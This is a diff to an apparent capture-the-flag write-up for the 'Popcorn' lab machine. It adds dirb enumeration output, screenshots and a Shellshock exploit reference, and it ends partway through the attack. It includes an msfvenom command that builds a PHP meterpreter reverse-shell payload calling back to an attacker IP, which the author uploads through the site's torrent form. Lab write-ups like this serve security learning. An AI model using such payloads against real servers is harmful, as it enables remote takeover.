@@ -119,9 +119,131 @@ Nmap done: 1 IP address (1 host up) scanned in 22.92 seconds
 + 1 host(s) tested
 ```
 
-#### gobuster
-```
+#### dirb
+```-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
 
+START_TIME: Mon Mar 16 19:28:13 2020
+URL_BASE: http://10.10.10.6/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.6/ ----
++ http://10.10.10.6/cgi-bin/ (CODE:403|SIZE:286)                                                                                
++ http://10.10.10.6/index (CODE:200|SIZE:177)                                                                                   
++ http://10.10.10.6/index.html (CODE:200|SIZE:177)                                                                              
++ http://10.10.10.6/server-status (CODE:403|SIZE:291)                                                                           
++ http://10.10.10.6/test (CODE:200|SIZE:47330)                                                                                  
+==> DIRECTORY: http://10.10.10.6/torrent/                                                                                       
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/ ----
+==> DIRECTORY: http://10.10.10.6/torrent/admin/                                                                                 
++ http://10.10.10.6/torrent/browse (CODE:200|SIZE:9278)                                                                         
++ http://10.10.10.6/torrent/comment (CODE:200|SIZE:936)                                                                         
++ http://10.10.10.6/torrent/config (CODE:200|SIZE:0)                                                                            
+==> DIRECTORY: http://10.10.10.6/torrent/css/                                                                                   
+==> DIRECTORY: http://10.10.10.6/torrent/database/                                                                              
++ http://10.10.10.6/torrent/download (CODE:200|SIZE:0)                                                                          
++ http://10.10.10.6/torrent/edit (CODE:200|SIZE:0)                                                                              
+==> DIRECTORY: http://10.10.10.6/torrent/health/                                                                                
++ http://10.10.10.6/torrent/hide (CODE:200|SIZE:3765)                                                                           
+==> DIRECTORY: http://10.10.10.6/torrent/images/                                                                                
++ http://10.10.10.6/torrent/index (CODE:200|SIZE:11356)                                                                         
++ http://10.10.10.6/torrent/index.php (CODE:200|SIZE:11356)                                                                     
+==> DIRECTORY: http://10.10.10.6/torrent/js/                                                                                    
+==> DIRECTORY: http://10.10.10.6/torrent/lib/                                                                                   
++ http://10.10.10.6/torrent/login (CODE:200|SIZE:8367)                                                                          
++ http://10.10.10.6/torrent/logout (CODE:200|SIZE:182)                                                                          
++ http://10.10.10.6/torrent/preview (CODE:200|SIZE:28104)                                                                       
+==> DIRECTORY: http://10.10.10.6/torrent/readme/                                                                                
++ http://10.10.10.6/torrent/rss (CODE:200|SIZE:1692)                                                                            
++ http://10.10.10.6/torrent/secure (CODE:200|SIZE:4)                                                                            
++ http://10.10.10.6/torrent/stylesheet (CODE:200|SIZE:321)                                                                      
+==> DIRECTORY: http://10.10.10.6/torrent/templates/                                                                             
++ http://10.10.10.6/torrent/thumbnail (CODE:200|SIZE:1789)                                                                      
+==> DIRECTORY: http://10.10.10.6/torrent/torrents/                                                                              
+==> DIRECTORY: http://10.10.10.6/torrent/upload/                                                                                
++ http://10.10.10.6/torrent/upload_file (CODE:200|SIZE:0)                                                                       
+==> DIRECTORY: http://10.10.10.6/torrent/users/                                                                                 
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/admin/ ----
++ http://10.10.10.6/torrent/admin/admin (CODE:200|SIZE:2988)                                                                    
++ http://10.10.10.6/torrent/admin/admin.php (CODE:200|SIZE:2988)                                                                
+==> DIRECTORY: http://10.10.10.6/torrent/admin/images/                                                                          
++ http://10.10.10.6/torrent/admin/index (CODE:200|SIZE:80)                                                                      
++ http://10.10.10.6/torrent/admin/index.php (CODE:200|SIZE:80)                                                                  
+==> DIRECTORY: http://10.10.10.6/torrent/admin/templates/                                                                       
++ http://10.10.10.6/torrent/admin/users (CODE:200|SIZE:80)                                                                      
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/database/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/health/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/lib/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/readme/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/templates/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/torrents/ ----
++ http://10.10.10.6/torrent/torrents/index (CODE:200|SIZE:0)                                                                    
++ http://10.10.10.6/torrent/torrents/index.php (CODE:200|SIZE:0)                                                                
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/upload/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/users/ ----
++ http://10.10.10.6/torrent/users/change_password (CODE:200|SIZE:80)                                                            
++ http://10.10.10.6/torrent/users/forgot_password (CODE:200|SIZE:7917)                                                          
++ http://10.10.10.6/torrent/users/img (CODE:200|SIZE:701)                                                                       
++ http://10.10.10.6/torrent/users/index (CODE:200|SIZE:80)                                                                      
++ http://10.10.10.6/torrent/users/index.php (CODE:200|SIZE:80)                                                                  
++ http://10.10.10.6/torrent/users/registration (CODE:200|SIZE:8175)                                                             
+==> DIRECTORY: http://10.10.10.6/torrent/users/templates/                                                                       
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/admin/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/admin/templates/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                
+---- Entering directory: http://10.10.10.6/torrent/users/templates/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Mon Mar 16 19:52:41 2020
+DOWNLOADED: 23060 - FOUND: 34
 ```
 
 #### http
@@ -131,12 +253,34 @@ http://10.10.10.6/
 http://10.10.10.6/test/
 ![http://10.10.10.6/test/](images/popcorn_3.png)
 
+Wappalyzer output - http://10.10.10.6/torrent/ 
+![http://10.10.10.6/torrent/](images/popcorn_4.png)
+
+Login - http://10.10.10.6/torrent/ 
+![http://10.10.10.6/torrent/](images/popcorn_5.png)
 ### Vulnerabilities
 ---
 
 ```
-Apache mod_cgi - 'Shellshock' Remote Command Injection  | exploits/linux/remote/34900.py
-
+* Apache mod_cgi - 'Shellshock' Remote Command Injection  | exploits/linux/remote/34900.py
 ```
 ### Exploits
 ---
+I first tried the Apache mod_cgi - 'Shellshock' Remote Command Injection with no success.
+The login - http://10.10.10.6/torrent/ ...looks like we can sign-up for an account!
+* user name: test
+* password: test
+* email: test@test.com
+
+![http://10.10.10.6/torrent/](images/popcorn_6.png)
+
+We're in as test users, we can browse the directory and have access to upload files.
+![http://10.10.10.6/torrent/index.php?mode=directory](images/popcorn_7.png)
+
+Let's create a msfvenon php package...
+```
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.24 LPORT=4447 -f raw > poison.php
+```
+Back to http://10.10.10.6/torrent/torrents.php?mode=upload upload the msfvenom file...
+![http://10.10.10.6/torrent/torrents.php?mode=upload](images/popcorn_8.png)
+
